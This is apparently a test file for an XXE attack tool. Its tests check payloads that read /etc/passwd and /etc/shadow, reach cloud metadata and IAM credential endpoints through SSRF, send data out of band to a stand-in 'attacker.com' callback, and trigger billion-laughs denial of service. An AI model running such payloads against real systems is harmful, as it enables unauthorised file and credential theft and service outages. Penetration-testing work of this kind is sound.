import { describe, expect, test } from 'bun:test'
import { z } from 'zod/v4'
import { __test } from './XXETool.js'

const { buildXmlPayload, detectVulnerability } = __test

const ACTIONS = ['detect', 'file_read', 'ssrf', 'oob', 'billion_laughs', 'svg'] as const

const schema = z.strictObject({
  url: z.string(),
  action: z.enum(ACTIONS),
  oob_url: z.string().optional(),
  file_path: z.string().optional().default('/etc/passwd'),
  data_template: z.string().optional(), // custom XML template with INJECT placeholder
  content_type: z.string().optional().default('application/xml'),
  method: z.enum(['POST', 'PUT', 'PATCH']).default('POST'),
  timeout_secs: z.number().int().min(5).max(300).default(30),
})

// =============================================================================
// Schema tests
// =============================================================================

describe('XXETool schema', () => {
  test('accepts detect action', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'detect' })
    expect(r.success).toBe(true)
  })

  test('accepts file_read action', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'file_read', file_path: '/etc/hosts' })
    expect(r.success).toBe(true)
  })

  test('accepts ssrf action', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'ssrf' })
    expect(r.success).toBe(true)
  })

  test('accepts oob action with callback url', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'oob', oob_url: 'http://callback.burp.com' })
    expect(r.success).toBe(true)
  })

  test('accepts billion_laughs action', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'billion_laughs' })
    expect(r.success).toBe(true)
  })

  test('rejects missing url', () => {
    const r = schema.safeParse({ action: 'detect' })
    expect(r.success).toBe(false)
  })

  test('rejects invalid action', () => {
    const r = schema.safeParse({ url: 'https://example.com', action: 'rce' })
    expect(r.success).toBe(false)
  })

  test('defaults file_path to /etc/passwd', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'file_read' })
    if (r.success) expect(r.data.file_path).toBe('/etc/passwd')
  })

  test('defaults method to POST', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'detect' })
    if (r.success) expect(r.data.method).toBe('POST')
  })

  test('accepts PUT method', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'detect', method: 'PUT' })
    expect(r.success).toBe(true)
  })

  test('accepts PATCH method', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'detect', method: 'PATCH' })
    expect(r.success).toBe(true)
  })

  test('rejects GET method', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'detect', method: 'GET' })
    expect(r.success).toBe(false)
  })

  test('rejects timeout below minimum', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'detect', timeout_secs: 4 })
    expect(r.success).toBe(false)
  })

  test('defaults content_type to application/xml', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'detect' })
    if (r.success) expect(r.data.content_type).toBe('application/xml')
  })

  test('accepts custom content_type', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'detect', content_type: 'text/xml' })
    expect(r.success).toBe(true)
    if (r.success) expect(r.data.content_type).toBe('text/xml')
  })
})

// =============================================================================
// buildXmlPayload tests
// =============================================================================

describe('buildXmlPayload — detect', () => {
  test('returns at least 2 payloads for detect action', () => {
    const payloads = buildXmlPayload('detect', { file_path: '/etc/passwd' })
    expect(payloads.length).toBeGreaterThanOrEqual(2)
  })

  test('detect payloads contain DOCTYPE', () => {
    const payloads = buildXmlPayload('detect', { file_path: '/etc/passwd' })
    for (const p of payloads) {
      expect(p).toContain('DOCTYPE')
    }
  })

  test('detect payloads reference /etc/hostname', () => {
    const payloads = buildXmlPayload('detect', { file_path: '/etc/passwd' })
    expect(payloads.some(p => p.includes('/etc/hostname'))).toBe(true)
  })
})

describe('buildXmlPayload — file_read', () => {
  test('returns at least 1 payload for file_read action', () => {
    const payloads = buildXmlPayload('file_read', { file_path: '/etc/passwd' })
    expect(payloads.length).toBeGreaterThanOrEqual(1)
  })

  test('file_read payload contains the target file path', () => {
    const payloads = buildXmlPayload('file_read', { file_path: '/etc/shadow' })
    expect(payloads[0]).toContain('/etc/shadow')
  })

  test('file_read payload uses file:// protocol', () => {
    const payloads = buildXmlPayload('file_read', { file_path: '/etc/passwd' })
    expect(payloads[0]).toContain('file://')
  })
})

describe('buildXmlPayload — ssrf', () => {
  test('returns at least 3 payloads for ssrf action', () => {
    const payloads = buildXmlPayload('ssrf', { file_path: '/etc/passwd' })
    expect(payloads.length).toBeGreaterThanOrEqual(3)
  })

  test('ssrf payloads include AWS metadata endpoint', () => {
    const payloads = buildXmlPayload('ssrf', { file_path: '/etc/passwd' })
    expect(payloads.some(p => p.includes('169.254.169.254'))).toBe(true)
  })

  test('ssrf payloads include localhost', () => {
    const payloads = buildXmlPayload('ssrf', { file_path: '/etc/passwd' })
    expect(payloads.some(p => p.includes('localhost'))).toBe(true)
  })
})

describe('buildXmlPayload — oob', () => {
  test('returns empty array when oob_url is missing', () => {
    const payloads = buildXmlPayload('oob', { file_path: '/etc/passwd' })
    expect(payloads).toHaveLength(0)
  })

  test('returns at least 1 payload with oob_url provided', () => {
    const payloads = buildXmlPayload('oob', { file_path: '/etc/passwd', oob_url: 'http://attacker.com' })
    expect(payloads.length).toBeGreaterThanOrEqual(1)
  })

  test('oob payload contains the callback URL', () => {
    const payloads = buildXmlPayload('oob', { file_path: '/etc/passwd', oob_url: 'http://attacker.com/callback' })
    expect(payloads[0]).toContain('http://attacker.com/callback')
  })
})

describe('buildXmlPayload — billion_laughs', () => {
  test('returns 1 payload for billion_laughs', () => {
    const payloads = buildXmlPayload('billion_laughs', { file_path: '/etc/passwd' })
    expect(payloads).toHaveLength(1)
  })

  test('billion_laughs payload contains entity expansion', () => {
    const payloads = buildXmlPayload('billion_laughs', { file_path: '/etc/passwd' })
    expect(payloads[0]).toContain('lol')
    expect(payloads[0]).toContain('ENTITY')
  })
})

describe('buildXmlPayload — unknown action', () => {
  test('returns empty array for unknown action', () => {
    const payloads = buildXmlPayload('unknown', { file_path: '/etc/passwd' })
    expect(payloads).toHaveLength(0)
  })
})

// =============================================================================
// detectVulnerability tests
// =============================================================================

describe('detectVulnerability — detect', () => {
  test('detects root: in body', () => {
    const r = detectVulnerability('detect', 'root:x:0:0:root:/root:/bin/bash')
    expect(r.vulnerable).toBe(true)
  })

  test('detects /bin/bash in body', () => {
    const r = detectVulnerability('detect', 'some content /bin/bash here')
    expect(r.vulnerable).toBe(true)
  })

  test('detects /bin/sh in body', () => {
    const r = detectVulnerability('detect', 'user:x:100:/bin/sh')
    expect(r.vulnerable).toBe(true)
  })

  test('returns false for empty body', () => {
    const r = detectVulnerability('detect', '')
    expect(r.vulnerable).toBe(false)
  })

  test('returns false for generic response body', () => {
    const r = detectVulnerability('detect', '<response>ok</response>')
    expect(r.vulnerable).toBe(false)
  })
})

describe('detectVulnerability — ssrf', () => {
  test('detects AWS ami-id metadata', () => {
    const r = detectVulnerability('ssrf', 'ami-id\ninstance-id')
    expect(r.vulnerable).toBe(true)
  })

  test('detects GCP computeMetadata', () => {
    const r = detectVulnerability('ssrf', '{"computeMetadata":{"v1":{}}}')
    expect(r.vulnerable).toBe(true)
  })

  test('returns false for generic 200 body', () => {
    const r = detectVulnerability('ssrf', '<html><body>404</body></html>')
    expect(r.vulnerable).toBe(false)
  })
})

describe('detectVulnerability — billion_laughs', () => {
  test('detects timeout in response', () => {
    const r = detectVulnerability('billion_laughs', 'Request timeout after 30s')
    expect(r.vulnerable).toBe(true)
  })

  test('detects 500 status in body', () => {
    const r = detectVulnerability('billion_laughs', 'HTTP 500 Internal Server Error')
    expect(r.vulnerable).toBe(true)
  })

  test('returns false for clean response', () => {
    const r = detectVulnerability('billion_laughs', '<response>parsed ok</response>')
    expect(r.vulnerable).toBe(false)
  })
})

// =============================================================================
// buildXmlPayload — svg (image-upload XXE vector)
// =============================================================================

describe('buildXmlPayload — svg', () => {
  test('generates an SVG-wrapped XXE payload', () => {
    const payloads = buildXmlPayload('svg', { file_path: '/etc/passwd' })
    expect(payloads.length).toBe(1)
    expect(payloads[0]).toContain('<svg')
    expect(payloads[0]).toContain('file:///etc/passwd')
    expect(payloads[0]).toContain('<!ENTITY xxe SYSTEM')
  })

  test('svg payload honors a custom file_path', () => {
    const payloads = buildXmlPayload('svg', { file_path: '/etc/shadow' })
    expect(payloads[0]).toContain('file:///etc/shadow')
  })

  test('detectVulnerability treats svg like a file read', () => {
    const r = detectVulnerability('svg', 'root:x:0:0:root:/root:/bin/bash')
    expect(r.vulnerable).toBe(true)
  })
})

// =============================================================================
// data_template tests (new field)
// =============================================================================

describe('XXETool schema — data_template', () => {
  test('accepts data_template parameter', () => {
    const r = schema.safeParse({
      url: 'https://example.com/api/xml',
      action: 'file_read',
      data_template: '<root><name>INJECT</name></root>',
    })
    expect(r.success).toBe(true)
  })

  test('data_template is optional', () => {
    const r = schema.safeParse({ url: 'https://example.com/api/xml', action: 'detect' })
    expect(r.success).toBe(true)
    if (r.success) expect(r.data.data_template).toBeUndefined()
  })
})

// =============================================================================
// detectVulnerability — new detection cases
// =============================================================================

describe('detectVulnerability — enhanced file detection', () => {
  test('detects /proc/net/tcp hex IP:port pattern', () => {
    // /proc/net/tcp contains hex IP:port pairs like "0100007F:0035"
    const r = detectVulnerability('file_read', '  0: 0100007F:0035 00000000:0000 0A')
    expect(r.vulnerable).toBe(true)
  })

  test('detects SSH private key', () => {
    const r = detectVulnerability('file_read', '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIB...')
    expect(r.vulnerable).toBe(true)
  })

  test('detects OpenSSH private key', () => {
    const r = detectVulnerability('file_read', '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaA==')
    expect(r.vulnerable).toBe(true)
  })

  test('detects environment variable secrets', () => {
    const r = detectVulnerability('file_read', 'DATABASE_URL=postgres://admin:secret@localhost/db')
    expect(r.vulnerable).toBe(true)
  })

  test('detects /sbin/nologin (passwd file indicator)', () => {
    const r = detectVulnerability('file_read', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin')
    expect(r.vulnerable).toBe(true)
  })
})

describe('detectVulnerability — ssrf enhanced targets', () => {
  test('detects Redis RESP protocol in SSRF', () => {
    const r = detectVulnerability('ssrf', '+PONG\r\n')
    expect(r.vulnerable).toBe(true)
  })

  test('detects Elasticsearch tagline in SSRF', () => {
    const r = detectVulnerability('ssrf', '{"tagline":"You Know, for Search","cluster_name":"main"}')
    expect(r.vulnerable).toBe(true)
  })

  test('detects Azure metadata in SSRF', () => {
    const r = detectVulnerability('ssrf', '{"subscriptionId":"12345-xyz","resourceGroupName":"prod-rg"}')
    expect(r.vulnerable).toBe(true)
  })
})

describe('buildXmlPayload — ssrf enhanced targets', () => {
  test('ssrf payloads include IAM credentials endpoint', () => {
    const payloads = buildXmlPayload('ssrf', { file_path: '/etc/passwd' })
    expect(payloads.some(p => p.includes('iam/security-credentials'))).toBe(true)
  })

  test('ssrf payloads include Redis port 6379', () => {
    const payloads = buildXmlPayload('ssrf', { file_path: '/etc/passwd' })
    expect(payloads.some(p => p.includes('6379'))).toBe(true)
  })

  test('ssrf payloads include Kubernetes API (added cycle 3)', () => {
    const payloads = buildXmlPayload('ssrf', { file_path: '/etc/passwd' })
    expect(payloads.some(p => p.includes('10.96.0.1') || p.includes('namespaces'))).toBe(true)
  })

  test('ssrf payloads include Azure metadata with api-version (added cycle 3)', () => {
    const payloads = buildXmlPayload('ssrf', { file_path: '/etc/passwd' })
    expect(payloads.some(p => p.includes('api-version=2021-02-01'))).toBe(true)
  })
})

// =============================================================================
// data_template integration — verify custom template is used in payload
// =============================================================================

describe('buildXmlPayload — data_template integration', () => {
  test('file_read with data_template uses custom body instead of default wrapper', () => {
    const payloads = buildXmlPayload('file_read', {
      file_path: '/etc/passwd',
      data_template: '<custom><field>INJECT</field></custom>',
    })
    expect(payloads.length).toBeGreaterThanOrEqual(1)
    // The custom template should appear in at least one payload
    expect(payloads.some(p => p.includes('<custom>') || p.includes('INJECT'))).toBe(true)
  })

  test('detect with data_template wraps entity reference in custom XML', () => {
    const payloads = buildXmlPayload('detect', {
      file_path: '/etc/passwd',
      data_template: '<soap:Body><ns1:execute>INJECT</ns1:execute></soap:Body>',
    })
    expect(payloads.length).toBeGreaterThanOrEqual(1)
    // All payloads should contain DOCTYPE (entity definition) regardless of template
    expect(payloads.some(p => p.includes('DOCTYPE'))).toBe(true)
  })
})
